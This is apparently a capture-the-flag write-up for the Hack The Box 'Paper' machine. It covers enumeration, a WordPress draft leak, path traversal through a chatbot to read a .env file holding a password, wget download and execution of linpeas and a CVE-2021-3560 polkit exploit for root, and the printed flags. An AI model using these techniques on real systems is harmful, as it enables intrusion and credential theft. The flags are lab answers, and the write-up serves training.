# Paper - Easy

```shell
sudo vim /etc/hosts
#map ip to paper.htb

nmap -T4 -p- -A -Pn -v paper.htb

gobuster dir -u http://paper.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 50 -k
#enumerate webpage on port 80

nikto -h http://paper.htb
#scan webpage on port 80

gobuster dir -u https://paper.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 50 -k
#enumerate webpage on port 443

nikto -h https://paper.htb
#scan webpage on port 443

sudo vim /etc/hosts
#add office.paper

cmseek
#check office.paper

vim usernames.txt

wpscan --url http://office.paper -U usernames.txt --passwords /usr/share/wordlists/rockyou.txt

sudo vim /etc/hosts
#add chat.office.paper

#interact with the recyclops bot in chat
#we get password

ssh dwight@paper.htb
#login using password found earlier

#get user flag

#in attacker machine
python3 -m http.server

#in ssh
cd /tmp

wget http://10.10.14.3:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#machine vulnerable to cve-2021-3560

wget http://10.10.14.3:8000/cve-2021-3560.sh

chmod +x cve-2021-3560.sh

./cve-2021-3560.sh -f=y -t=0.004
#creates user

su - secnigma
#enter given password

sudo bash
#we are now root
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.0
  * 80 - http - Apache httpd 2.4.37 (centos)
  * 443 - ssl/http - Apache httpd 2.4.37 (centos)

* Enumerating the webpage on port 80 shows that it is the default landing page for HTTP servers powered by ```CentOS```.

* Furthermore, using ```Wappalyzer```, we find out that the webpage is using Apache 2.4.37 and OpenSSL 1.1.1k

* We can attempt to scan for web directories using ```feroxbuster``` - this gives us only one directory /manual.

* Now, we can attempt to enumerate the SSL webpage on port 443 by visiting <https://paper.htb>

* We can also attempt to scan both webpages using ```nikto``` to check for any vulnerabilities.

* While scanning the webpage on port 80 using ```nikto```, we get this prompt:

```Uncommon header 'x-backend-server' found, with contents: office.paper```

* We can add this domain to /etc/hosts file and then we can visit this page.

* <http://office.paper> shows a blog page for 'Blunder Tiffin'.

* We can check what CMS this page is using with the help of ```cmseek```.

* This tool detects WordPress 5.2.3; moreover it enumerates two usernames 'nick' and 'creedthoughts'.

* Furthermore, the author is 'prisonmike' - we can note these usernames down.

* Now, one of the blog mentions that there exists drafts somewhere.

* Googling for exploits for WordPress 5.2.3 give us results for viewing unauthenticated/private/draft posts.

* Using this simple exploit, we can visit the link <http://office.paper/?static=1>

* This includes the draft content - it mentions a secret registration URL for a new employee chat system - <http://chat.office.paper/register/8qozr226AhkCHZdyY>

* To visit this link, we have to first add this domain to /etc/hosts

* Now, using this link, we can create an account and register - this allows us to read the chats in the ```general``` channel.

* We have multiple users; we can interact with them by 'direct message', as the channel is read-only.

* Out of all the users, only ```recyclops``` is online, so we can interact with this bot.

* Using the ```help``` command, we can see all the commands that the bot responds to in the chat.

* We can now type all the commands to interact and enumerate for clues; this bot has some bugs so it does not respond to all commands.

* ```recyclops list``` lists the '/sales/' directory; similarly we can list the 'sale' subdirectory using ```recyclops list sale/```

* Now, we can check file contents using ```recyclops file sale/portfolio.txt```

* The directories do not contain anything, but we can list the parent folder using ```recyclops list sale/../..``` - we can enumerate the files from here.

* By listing the '.env' file inside 'hubot' directory, we get creds "recyclops:Queenofblad3s!23"

* By printing output of '/etc/passwd' in a similar style, we can see that there are no users named 'recyclops' - but we have users 'rocketchat' and 'dwight'.

* Using the password found earlier, we can login as 'dwight' via SSH.

* After getting user flag, we can now check for privesc using ```linpeas```.

* ```linpeas``` shows that the machine is vulnerable to CVE-2021-3560, which exploits a vulnerability in ```polkit``` package.

* Googling for the exploit gives us a GitHub PoC script, which can be transferred to ssh session and executed.

* Running this script creates a new user on the machine, and switching to that user and running ```sudo bash``` gives us a root shell.

```markdown
1. User flag - 73375861470dc4bcdfeb69de755ab7c7

2. Root flag - a4ca1063acb3491403111e09ae34e7ba
```
